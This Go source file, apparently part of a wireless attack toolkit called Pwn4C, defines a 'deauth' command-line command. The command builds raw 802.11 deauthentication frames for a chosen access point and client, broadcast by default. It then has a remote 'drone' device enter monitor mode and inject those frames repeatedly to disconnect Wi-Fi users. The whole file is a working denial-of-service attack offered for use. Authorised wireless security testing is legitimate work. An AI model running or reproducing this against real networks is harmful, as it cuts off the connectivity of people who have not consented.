package cmd

import (
	"fmt"
	"os"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
)

var (
	deauthBSSID    string
	deauthClient   string
	deauthCount    int
	deauthInterval int
	deauthChannel  int
	deauthTarget   string
)

var deauthCmd = &cobra.Command{
	Use:   "deauth [target_drone_ip]",
	Short: "Inject IEEE 802.11 Deauthentication frames to disconnect Wi-Fi clients",
	Long:  "Generates raw 802.11 management deauthentication frames and commands the drone to inject them over the air.",
	Args:  cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := deauthTarget
		if len(args) > 0 {
			target = args[0]
		}

		if target == "" {
			fmt.Println("[*] Searching for active Pwn4C drone...")
			drones, err := drone.Discover(2*time.Second, "")
			if err != nil || len(drones) == 0 {
				fmt.Println("[!] No drone discovered. Please specify drone IP directly.")
				os.Exit(1)
			}
			target = drones[0].IP
			fmt.Printf("[+] Discovered drone at %s\n", target)
		}

		if deauthBSSID == "" {
			fmt.Println("[!] Error: Target AP BSSID is required (--bssid / -b).")
			os.Exit(1)
		}

		// 1. Build the Deauth packet
		frameHex, err := drone.BuildDeauthFrame(deauthBSSID, deauthClient, drone.ReasonClass3FromNonAssocSTA)
		if err != nil {
			fmt.Printf("[!] Failed to build 802.11 deauth frame: %v\n", err)
			os.Exit(1)
		}

		// 2. Connect to Drone TCP Control
		fmt.Printf("[+] Connecting to drone at %s:%d...\n", target, drone.DefaultControlPort)
		client, err := drone.ConnectControl(target, 5*time.Second)
		if err != nil {
			fmt.Printf("[!] Failed to connect: %v\n", err)
			os.Exit(1)
		}
		defer client.Close()

		// 3. Ensure Monitor mode is active on the correct channel
		status, err := client.GetStatus()
		if err != nil {
			fmt.Printf("[!] Failed to query drone status: %v\n", err)
			os.Exit(1)
		}

		if !status.MonitorActive {
			fmt.Printf("[+] Activating monitor mode on channel %d...\n", deauthChannel)
			if err := client.StartMonitor(deauthChannel); err != nil {
				fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
				os.Exit(1)
			}
		} else if status.Channel != deauthChannel {
			fmt.Printf("[+] Switching channel from %d to %d...\n", status.Channel, deauthChannel)
			if err := client.SetChannel(deauthChannel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				os.Exit(1)
			}
		}

		// 4. Send Injection Command
		destLabel := deauthClient
		if destLabel == "" || destLabel == "ff:ff:ff:ff:ff:ff" {
			destLabel = "Broadcast (All Clients)"
		}

		fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
		fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
		fmt.Printf("    Client     : %s\n", destLabel)
		fmt.Printf("    Channel    : %d\n", deauthChannel)

		sent, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
		if err != nil {
			fmt.Printf("[!] Injection failed: %v\n", err)
			os.Exit(1)
		}

		fmt.Printf("[+] Injection completed. Frames sent: %d, Failed: %d\n", sent, failed)
	},
}

func init() {
	deauthCmd.Flags().StringVarP(&deauthBSSID, "bssid", "b", "", "Target Access Point BSSID (e.g. AA:BB:CC:DD:EE:FF)")
	deauthCmd.Flags().StringVarP(&deauthClient, "client", "c", "ff:ff:ff:ff:ff:ff", "Target Client MAC address (defaults to broadcast)")
	deauthCmd.Flags().IntVarP(&deauthChannel, "channel", "i", 1, "Wi-Fi channel of the target AP (1-13)")
	deauthCmd.Flags().IntVarP(&deauthCount, "count", "n", 10, "Number of deauth frames to transmit")
	deauthCmd.Flags().IntVar(&deauthInterval, "interval", 10, "Interval between transmissions in milliseconds")
	deauthCmd.Flags().StringVarP(&deauthTarget, "target", "t", "", "Drone IP address")
	_ = deauthCmd.MarkFlagRequired("bssid")

	rootCmd.AddCommand(deauthCmd)
}
